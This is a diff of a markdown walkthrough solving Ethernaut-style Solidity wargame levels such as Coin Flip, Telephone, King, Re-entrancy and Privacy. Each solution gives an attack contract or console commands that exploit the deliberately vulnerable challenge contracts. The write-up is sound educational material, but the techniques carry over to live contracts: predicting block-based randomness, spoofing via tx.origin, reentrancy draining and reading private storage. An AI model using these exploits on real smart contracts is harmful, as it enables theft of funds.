@@ -2,11 +2,11 @@
 
 ## [Note]:
 
-1. The first step at all level you need create new instance button, after confirm transaction You can see contract address as the image:
+1. The first step at all level you need click new instance button, after confirm transaction You can see contract address as the image:
 
     ![img](./img/create_instance.png)
 
-2. When you see `<file_name>.sol`. We need create a `<file_name>.sol` to deploy or inject it to metamask. 
+2. When you see `<file_name>.sol`. We need create a `<file_name>.sol` to deploy and inject it to metamask. 
 
    You can use that: https://remix.ethereum.org/
 
@@ -47,12 +47,8 @@ confirm transaction and wait until done
 ### Fallback:
 console:
 ```
-contract.contribute({value: 1})
-```
-```
+await contract.contribute({value: 1})
 await contract.sendTransaction({value: 1})
-```
-```
 await contract.withdraw()
 ```
 ===> submit level
@@ -66,12 +62,12 @@ contract.Fal1out()
 
 
 ### Coin Flip
-CoinFlip.sol ==> create and copy content of this level.<br>
+`CoinFlip.sol` ==> create and copy content of this level.<br>
 replace:<br> 
 - `@openzeppelin/contracts/math/SafeMath.sol` => `https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol`<br>
-- `pragma solidity ^0.6.0` => `pragma solidity ^0.8.0;`;
+- `pragma solidity ^0.6.0;` => `pragma solidity ^0.8.0;`
 
-CoinFlipAttack.sol ==>
+`CoinFlipAttack.sol`
 ```
 pragma solidity ^0.8.0;
 import './CoinFlip.sol';
@@ -82,7 +78,7 @@ contract CoinFlipAttack {
     uint256 FACTOR = <copy_from_CoinFlip.sol>;
     
     constructor(address v) public {
-        _v = v;
+        _v = CoinFlip(v);
     }
 
     function flip() public returns (bool) {
@@ -109,8 +105,8 @@ check `words` property is `[10, anything_there]`
 <br>
 
 ### Telephone
-Telephone.sol ==> create and copy content of this level.<br>
-TelephoneAttack.sol
+`Telephone.sol` ==> create and copy content of this level.<br>
+`TelephoneAttack.sol`
 ```
 pragma solidity ^0.6.0;
 import './Telephone.sol';
@@ -132,9 +128,9 @@ contract TelephoneAttack {
 Deploy with params:<br>
 - address: `contract.address` get on console window
 
-click attack with param is your address
+click `attack` button with param is player address
 <br>
-check `contract.address` will be your address
+check `contract.address` will be player address
 
 ===> submit level
 
@@ -155,7 +151,7 @@ contract.sendTransaction({data: web3.utils.sha3("pwn()")})
 ===> Submit level
 
 ### Force
-ForceAttack.sol
+`ForceAttack.sol`
 ```
 pragma solidity ^0.4.26;
 
@@ -171,7 +167,7 @@ contract ForceAttack {
 Deploy `ForceAttack.sol` with params:<br>
 - value: 1 wei
 
-Execute attack button with `contract.address` on console window
+Execute `attack` button with `contract.address` on console window
 
 ===> Submit level
 
@@ -182,13 +178,13 @@ console
 let pwd;
 await web3.eth.getStorageAt(contract.address, 1, (e,r)=>{pwd=r;})
 await web3.utils.toAscii(pwd)
-contract.unlock(pwd)
+await contract.unlock(pwd)
 await contract.locked()
 ```
 ===> Submit level
 
 ### King
-AttackKing.sol
+`AttackKing.sol`
 ```
 pragma solidity ^0.4.26;
 
@@ -209,9 +205,44 @@ Deploy with params:<br>
 
 ===> Submit level
 
+<!-- ### Re-entrancy
+`Reentrancy.sol` ==> create and copy content of this level.<br>
+replace
+- `@openzeppelin/contracts/math/SafeMath.sol` => `https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol`<br>
+
+`ReentrancyAttack.sol`
+```
+pragma solidity ^0.6.0;
+import './Reentrance.sol';
+
+contract ReentranceAttack {
+    Reentrance w;
+    uint public a = 1 ether;
+    
+    constructor(address payable t) public payable {
+        w = Reentrance(t);
+    }
+
+    function donateToTarget() public {
+        w.donate.value(a).gas(4000000)(address(this));
+    }
+
+    fallback() external payable {
+        if(address(w).balance != 0) {
+            w.withdraw(a);
+        }
+    }
+}
+```
+
+Deploy with params:<br>
+- address: `contract.address` get on console window
+- value: 1 ether
+
+===> submit level -->
 ### Elevator
-Elevator.sol ==> create and copy content of this level.<br>
-ElevatorAttack.sol
+`Elevator.sol` ==> create and copy content of this level.<br>
+`ElevatorAttack.sol`
 ```
 pragma solidity ^0.6.0;
 import './Elevator.sol';
@@ -238,12 +269,49 @@ contract ElevatorAttack {
 Deploy with params:<br>
 - address: `contract.address` get on console window
 
-click button setTop with param is 15
+click `setTop` button with param is 15
 
 ===> submit level
 
+
+### Privacy
+console
+```
+//copy this address
+await web3.eth.getStorageAt(contract.address, 5, (e,r) => {console.log(r)})
+```
+Copy logged address.
+
+`Privacy.sol` ===> copy in this level
+<br>`PrivacyAttack.sol`
+```
+pragma solidity ^0.6.0;
+import './Privacy.sol';
+
+contract PrivacyAttack {
+    Privacy public target;
+
+    constructor(address a) public payable{
+        target = Privacy(a);
+    }
+
+    function unlock(bytes32 s) public {
+        bytes16 k = bytes16(s);
+        target.unlock(k);
+    }
+}
+```
+Deploy with params:<br>
+- address: `contract.address` get on console window
+
+Click buttuon attack with param is address_copied
+
+
+===> submit level
+
+
 ### Gatekeeper Two
-GatekeeperTwoAttack.sol
+`GatekeeperTwoAttack.sol`
 ```
 pragma solidity ^0.6.0;
 
@@ -265,15 +333,15 @@ console:<br>
 ```
 let a = (await contract.balanceOf(player)).toString();
 await contract.approve(player, a);
-(await contract.allowance(player, player)).toString();
+```
+```
 //any_address do not use player address
 await contract.transferFrom(player, "<any_address>", a)
-(await contract.balanceOf(player)).toString()
 ``` 
-==> 0
+===> submit level
 
 ### Preservation
-PreservationAttack.sol
+`PreservationAttack.sol`
 ```
 pragma solidity ^0.6.0;
 
@@ -300,7 +368,7 @@ await contract.setFirstTime("12345")
 ```
 ===> submit level
 
-### Recovery
+<!-- ### Recovery
 console
 ```
 let data = await web3.eth.abi.encodeFunctionCall({
@@ -317,4 +385,7 @@ await web3.eth.sendTransaction({
     data: data
 })
 ```
-===> submit level
+===> submit level -->
+
+## [Tip]
+get instance of all 10 first level in once. => save time
